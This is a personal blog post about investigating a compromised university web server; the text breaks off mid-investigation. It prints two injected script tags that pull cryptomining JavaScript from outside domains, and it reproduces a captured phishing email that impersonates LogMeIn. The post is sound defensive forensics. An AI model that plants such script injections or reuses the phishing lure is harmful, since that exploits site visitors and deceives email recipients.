<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="During my Masters work at U oF T, I supported the operations of an OpenStack-based Cloud infrastructure (SAVI) and make sure it&rsquo;s up and running. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how we investigated this issue on our platform.\n">
<title>Uncovering Cryptojacking/Phishing At University of Toronto</title>

<link rel='canonical' href='http://localhost:1313/posts/cryptojacking-phishing-savi/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Uncovering Cryptojacking/Phishing At University of Toronto">
<meta property='og:description' content="During my Masters work at U oF T, I supported the operations of an OpenStack-based Cloud infrastructure (SAVI) and make sure it&rsquo;s up and running. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how we investigated this issue on our platform.\n">
<meta property='og:url' content='http://localhost:1313/posts/cryptojacking-phishing-savi/'>
<meta property='og:site_name' content='My Personal Site'>
<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:published_time' content='2020-06-06T17:50:51-05:00'/><meta property='article:modified_time' content='2020-06-06T17:50:51-05:00'/><meta property='og:image' content='http://localhost:1313/posts/cryptojacking-phishing-savi/cover.jpg' />
<meta name="twitter:title" content="Uncovering Cryptojacking/Phishing At University of Toronto">
<meta name="twitter:description" content="During my Masters work at U oF T, I supported the operations of an OpenStack-based Cloud infrastructure (SAVI) and make sure it&rsquo;s up and running. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how we investigated this issue on our platform.\n"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='http://localhost:1313/posts/cryptojacking-phishing-savi/cover.jpg' />
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "dark");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column compact"><aside class="sidebar left-sidebar sticky compact">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_f509edb42ecc0ebd.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">My Personal Site</a></h1>
            <h2 class="site-description"></h2>
        </div>
    </header><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/page/about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    

            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/posts/cryptojacking-phishing-savi/">
                <img src="/posts/cryptojacking-phishing-savi/cover_hu_c86b681f3fee94ff.jpg"
                        srcset="/posts/cryptojacking-phishing-savi/cover_hu_c86b681f3fee94ff.jpg 800w, /posts/cryptojacking-phishing-savi/cover_hu_bea442a1395058f4.jpg 1600w"
                        width="800" 
                        height="534" 
                        loading="lazy"
                        alt="Featured image of post Uncovering Cryptojacking/Phishing At University of Toronto" />
                
            </a>
        </div>
    

    <div class="article-details">
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/posts/cryptojacking-phishing-savi/">Uncovering Cryptojacking/Phishing At University of Toronto</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Jun 06, 2020</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    12 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <p>During my Masters work at U oF T, I supported the operations of an OpenStack-based Cloud infrastructure (SAVI) and make sure it&rsquo;s up and running. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how we investigated this issue on our platform.</p>
<p>Note that for privacy concerns, we removed the actual website domain and replaced the public IP addresses as private addresses.
We begin by logging into the machine and begin our analysis with some understanding of the network connections.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>user@host:~$ sudo netstat -an
</span></span><span style="display:flex;"><span>Active Internet connections (servers and established)
</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State
</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN
</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:38252   204.188.217.106:80      ESTABLISHED
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:22      10.10.10.12:58172       ESTABLISHED
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:55387   204.188.217.106:80      ESTABLISHED
</span></span><span style="display:flex;"><span>tcp6       0      0 :::80                   :::*                    LISTEN
</span></span><span style="display:flex;"><span>tcp6       0      0 :::22                   :::*                    LISTEN
</span></span><span style="display:flex;"><span>tcp6       0      0 :::25                   :::*                    LISTEN
</span></span><span style="display:flex;"><span>tcp6       0      0 :::443                  :::*                    LISTEN
</span></span><span style="display:flex;"><span>udp        0      0 10.10.10.10:123     0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 127.0.0.1:123           0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 0.0.0.0:123             0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 0.0.0.0:59028           0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 127.0.0.1:18120         0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 0.0.0.0:1812            0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 0.0.0.0:1813            0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 0.0.0.0:1814            0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 0.0.0.0:51414           0.0.0.0:*
</span></span><span style="display:flex;"><span>udp6       0      0 fe80::219:b9ff:fe2c:123 :::*
</span></span><span style="display:flex;"><span>udp6       0      0 ::1:123                 :::*
</span></span><span style="display:flex;"><span>udp6       0      0 :::123                  :::*
</span></span></code></pre></div><p>Based on the <strong>netstat connections</strong>, we realize a few <em><code>tcp</code></em> connections using the port <em>80</em>. Thus, we try to find the processes using these connections:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>user@host:~$ sudo lsof -i tcp:80 -P -R
</span></span><span style="display:flex;"><span>COMMAND     PID  PPID     USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME
</span></span><span style="display:flex;"><span>/usr/sbin 26545     1 www-data    3u  IPv4 22142705      0t0  TCP website.ca:55464-&gt;204.188.217.106:80 (ESTABLISHED)
</span></span><span style="display:flex;"><span>/usr/sbin 26550     1 www-data    3u  IPv4 22105560      0t0  TCP website.ca:38252-&gt;204.188.217.106:80 (ESTABLISHED)
</span></span><span style="display:flex;"><span>apache2   27805     1     root    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   27993 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   28066 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   28067 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   28447 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   28449 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   29256 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   29262 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   29373 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   29375 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span><span style="display:flex;"><span>apache2   29436 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
</span></span></code></pre></div><p>We realize that there are connections to some other IP address with port <em>80</em>, so we take a deeper dive on the process <strong>26545</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>user@host:~$ sudo lsof -p 26545
</span></span><span style="display:flex;"><span>COMMAND     PID     USER   FD   TYPE             DEVICE SIZE/OFF     NODE NAME
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  cwd    DIR              252,0    69632  3538945 /tmp
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  rtd    DIR              252,0     4096        2 /
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  txt    REG              252,0    10416  3017043 /usr/bin/perl
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0    43416  4981915 /usr/lib/perl/5.18.2/auto/Socket/Socket.so
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0    18728  4981918 /usr/lib/perl/5.18.2/auto/IO/IO.so
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0    43368  6946983 /lib/x86_64-linux-gnu/libcrypt-2.19.so
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0   141574  6947044 /lib/x86_64-linux-gnu/libpthread-2.19.so
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0  1071552  6946910 /lib/x86_64-linux-gnu/libm-2.19.so
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0    14664  6946980 /lib/x86_64-linux-gnu/libdl-2.19.so
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0  1840928  6947193 /lib/x86_64-linux-gnu/libc-2.19.so
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0  1608280  3017046 /usr/lib/libperl.so.5.18.2
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data  mem    REG              252,0   149120  6947052 /lib/x86_64-linux-gnu/ld-2.19.so
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data    0r   CHR                1,3      0t0     6368 /dev/null
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data    1w  FIFO                0,8      0t0 22105555 pipe
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data    2w   REG              252,0    14135 10751213 /var/log/apache2/error.log
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data    3u  IPv4           22143052      0t0      TCP website.ca:55789-&gt;204.188.217.106:http (ESTABLISHED)
</span></span><span style="display:flex;"><span>/usr/sbin 26545 www-data    6u  unix 0xffff88022e742c00      0t0 22105553 socket
</span></span></code></pre></div><p>Seems like there are perl processes running and also some access to <code>/var/log/apache2/error.log</code>. Also, the IP address <code>204.188.217.106</code> keeps recurring. Since we know it&rsquo;s somehow related to the webserver, we check the <code>/var/www</code> directory to check for any activity by the user <code>www-data</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>user@host:/var/www$ ls -la
</span></span><span style="display:flex;"><span>total 56
</span></span><span style="display:flex;"><span>drwxr-xr-x 13 root     root     4096 Sep 10 22:37 .
</span></span><span style="display:flex;"><span>drwxr-xr-x 13 root     root     4096 Feb 28  2017 ..
</span></span><span style="display:flex;"><span>drwxr-xr-x  5 root     root     4096 Oct  3  2016 alg.old
</span></span><span style="display:flex;"><span>drwxr-xr-x  8 root     root     4096 Aug 23  2013 corporateclean
</span></span><span style="display:flex;"><span>drwxr-xr-x  2 root     root     4096 Jul 17  2012 demo
</span></span><span style="display:flex;"><span>drwxr-xr-x  2 root     root     4096 Feb  1  2017 html
</span></span><span style="display:flex;"><span>drwxr-xr-x 11 www-data www-data 4096 Sep  3 23:52 subdomain
</span></span><span style="display:flex;"><span>drwxr-xr-x  5 root     root     4096 Nov 29  2017 nal
</span></span><span style="display:flex;"><span>drwxr-xr-x  2 root     root     4096 Mar  3  2015 phpmyadmin
</span></span><span style="display:flex;"><span>drwxrwxr-x  6 www-data www-data 4096 Feb  5  2018 site
</span></span><span style="display:flex;"><span>drwxr-xr-x  8 root     root     4096 Feb 28  2017 site-wp-3.3
</span></span><span style="display:flex;"><span>drwxr-xr-x  6 stack    stack    4096 Feb 28  2017 site-wp-3.5
</span></span><span style="display:flex;"><span>drwxr-xr-x  6 stack    stack    4096 Feb 28  2017 site-wp-3.7
</span></span><span style="display:flex;"><span>-rw-r--r--  1 root     root       21 May  4  2012 test.php
</span></span></code></pre></div><p>By the looks of the output, there could be two folders: <code>subdomain</code> and <code>site</code>. Since <code>subdomain</code> is the most recent updated folder, we take a deeper dive on the <code>includes/</code> subfolder:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>user@host:/var/www/subdomain$ ls -la --full-time includes/
</span></span><span style="display:flex;"><span>total 1804
</span></span><span style="display:flex;"><span>drwxr-xr-x  4 www-data www-data   4096 2017-05-25 21:38:11.742771907 -0400 .
</span></span><span style="display:flex;"><span>drwxr-xr-x 11 www-data www-data   4096 2018-09-03 23:52:29.924296116 -0400 ..
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data  13816 2017-05-25 17:54:24.388035506 -0400 actions.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data  46913 2017-05-25 17:54:24.388035506 -0400 ajax.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data   1701 2017-05-25 17:54:24.388035506 -0400 archiver.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data  13664 2017-05-25 17:54:24.384035450 -0400 authorize.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data  17497 2017-05-25 17:54:24.388035506 -0400 batch.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data   2310 2017-05-25 17:54:24.380035393 -0400 batch.queue.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data 118488 2018-08-27 06:20:36.531461159 -0400 bootstrap.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data  19998 2017-05-25 17:54:24.384035450 -0400 cache.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data   2487 2017-05-25 17:54:24.384035450 -0400 cache-install.inc
</span></span><span style="display:flex;"><span>-rw-r--r--  1 www-data www-data 302278 2017-05-25 17:54:24.384035450 -0400 common.inc
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>There&rsquo;s one particulr line that looks very suspicious (because of the last updated timetstamp and the size is larger than the others:</p>
<p><code>-rw-r--r--  1 www-data www-data 118488 2018-08-27 06:20:36.531461159 -0400 bootstrap.inc</code></p>
<p>While sifting through the file, near the end we found this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>?&gt;&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//upgraderservices.cf/drupal.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;<span style="color:#75715e">&lt;?php^M
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//drupalupdates.tk/check.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;<span style="color:#960050;background-color:#1e0010">&lt;</span>?php^M
</span></span></code></pre></div><p>This looks suspicious, so we researched this piece of code (i.e., googled it), and found out that these were cryptomining scripts, as reported by this: <a class="link" href="https://twitter.com/bad_packets/status/1037416308336287744"  target="_blank" rel="noopener"
    >https://twitter.com/bad_packets/status/1037416308336287744</a></p>
<p>To remediate this issue, we simply removed these scripts. However, the connections still persisted:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>user@host:/var/www/subdomain$ netstat -an
</span></span><span style="display:flex;"><span>Active Internet connections (servers and established)
</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State
</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN
</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
</span></span><span style="display:flex;"><span>tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:42191   98.137.157.43:25        TIME_WAIT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:47567   192.64.147.176:25       SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:48204   23.20.239.12:25         SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:46017   67.195.228.87:25        TIME_WAIT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:48211   23.20.239.12:25         SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:50025   98.136.101.116:25       TIME_WAIT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:49812   52.162.126.195:25       SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:36409   185.53.178.8:25         SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:48231   23.20.239.12:25         SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:43103   207.148.248.145:25      SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:58587   162.255.119.180:25      SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0    168 10.10.10.10:22      10.10.10.12:38580   ESTABLISHED
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:42186   98.137.157.43:25        TIME_WAIT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:45291   68.178.213.61:25        SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:37805   204.188.217.106:80      ESTABLISHED
</span></span><span style="display:flex;"><span>tcp        0   2205 10.10.10.10:34654   216.120.254.206:25      ESTABLISHED
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:39909   184.168.131.241:25      SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:48962   184.168.47.225:25       SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:38409   98.136.96.73:25         TIME_WAIT
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:55883   216.251.100.19:25       ESTABLISHED
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:32777   204.188.217.106:80      ESTABLISHED
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:33846   159.8.40.50:25          SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:47992   198.185.159.145:25      SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      1 10.10.10.10:39920   184.168.131.241:25      SYN_SENT
</span></span><span style="display:flex;"><span>tcp        0      0 10.10.10.10:37092   66.218.85.151:25        TIME_WAIT
</span></span><span style="display:flex;"><span>tcp6       0      0 :::80                   :::*                    LISTEN
</span></span><span style="display:flex;"><span>tcp6       0      0 :::22                   :::*                    LISTEN
</span></span><span style="display:flex;"><span>tcp6       0      0 :::25                   :::*                    LISTEN
</span></span><span style="display:flex;"><span>tcp6       0      0 :::443                  :::*                    LISTEN
</span></span><span style="display:flex;"><span>udp        0      0 10.10.10.10:123     0.0.0.0:*
</span></span><span style="display:flex;"><span>udp        0      0 127.0.0.1:123           0.0.0.0:*
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Now there is even a SMTP port open (port <strong>25</strong>). We sniff some packets on the SMTP port:</p>
<pre tabindex="0"><code>user@host:/var/www/subdomain$ sudo tshark &#34;port 25&#34;
Running as user &#34;root&#34; and group &#34;root&#34;. This could be dangerous.
tshark: Lua: Error during loading:
 /usr/share/wireshark/init.lua:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.
Capturing on &#39;eth0&#39;
155 187.354503622  74.6.137.68 → 10.10.10.10 SMTP 171 S: 250 sender &lt;www-data@www.website.ca&gt; ok | 250 recipient &lt;atheneos@atheneoscafe.com&gt; ok | 354 go ahead
156 187.354596107 10.10.10.10 → 74.6.137.68  SMTP 1514 C: DATA fragment, 1448 bytes
157 187.354605929 10.10.10.10 → 74.6.137.68  SMTP|IMF 853 subject: =?UTF-8?B?TG9nTWVJbiBOb3RpZmljYXRpb24gLSBDb21wdXRlciBJRDogMjg1MzI4NTczNSBkZWxldGVk?=, from: =?UTF
-8?B?TG9nTWVJbi5jb20=?= &lt;noreplay@logmein.com&gt;, ,   , &lt;p&gt;Event: Computer deleted&lt;/p&gt;  , &lt;p&gt;If this is an error, use the link bellow to restore your computer back.&lt;/p&gt;
, &lt;p&gt;&lt;a rel=&#34;nofollow noopener&#34; target=&#34;_blank&#34; href=&#34;https://restore.logmein.click/pc/?e=bmV0LmFzc2FzeW5AeWFob28uY29t&#34; style=&#34;outline: none; color: #00aeef; font-weight:
bold; text-decoration: none;&#34;&gt;http://restore.logmein.com/login.aspx?clusterid=YXRoZW5lb3NAYXRoZW5lb3NjYWZlLmNvbQ==&lt;/a&gt;&lt;br /&gt; &lt;br /&gt; Account holder: atheneos@atheneoscafe.com
&lt;br /&gt; Computer ID: 5714726389 &lt;br /&gt; At: 21.12.2018 13:03:20&lt;br /&gt; From: 127.0.0.1 (localhost)&lt;br /&gt; &lt;br /&gt; LogMeIn Account Holders can change notification settings
by clicking their LogMeIn ID in the upper-right corner of LogMeIn Central and then Account &amp;gt; Security &amp;gt; Account Audit.&lt;/p&gt;  , &lt;p&gt;&lt;/p&gt;  , &lt;p&gt;&lt;span style=&#34;color: #333333;
font-family: arial, sans-serif; font-size: 11px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space:
normal; widows: 2; word-spacing: 0px; background-color: #ffffff; text-decoration-color: initial; display: inline !important; float: none;&#34;&gt;Copyright &amp;copy; 2003-2018 LogMeIn,
Inc.&lt;/span&gt;&lt;a rel=&#34;nofollow noopener&#34; target=&#34;_blank&#34; href=&#34;https://secure.logmein.com/policies/trademark.aspx&#34; style=&#34;margin: 0px; padding: 0px; border: 0px; font-style: normal;
font-weight: 400; font-stretch: inherit; font-size: 11px; line-height: inherit; font-family: arial, sans-serif; vertical-align: baseline; outline: 0px; color: #0088ce;
text-decoration: none; cursor: pointer; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px;
background-color: #ffffff;&#34;&gt;All rights reserved.&lt;/a&gt;&lt;/p&gt;  ,   ,   ,
</code></pre><p>Now, this looks more like phishing activity. Therefore this was an independent attack from the previous cryptojacking attack. This explains why removing the scripts did not close the connections.</p>
<h2 id="phishing-attack">Phishing Attack
</h2><p>We realize there are potentially 2 (common) ways to attacking this server: either through the <strong>ssh</strong> open port <strong>22</strong> or through the web application (hosted on port <strong>80</strong>). Since, we saw a lot of activity with the web-server, we thought of visiting the domain of the website and checking for suspicious elements on the background.</p>
<p>Upon visiting the subdomain site’s main page <a class="link" href="https://subdomain.website.ca"  target="_blank" rel="noopener"
    >https://subdomain.website.ca</a>, when inspecting the elements on the HTML page of the site, we found a hidden javascript tag code that has a suspicious link.</p>
<p>[<!-- raw HTML omitted -->]({{ site.baseurl }}/)</p>
<p>Just like any (in)sane person would do, we downloaded the file and take a look:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>user@host:$  wget http://wt-23...full-http-control
</span></span><span style="display:flex;"><span>user@host:$ cat full-http-control
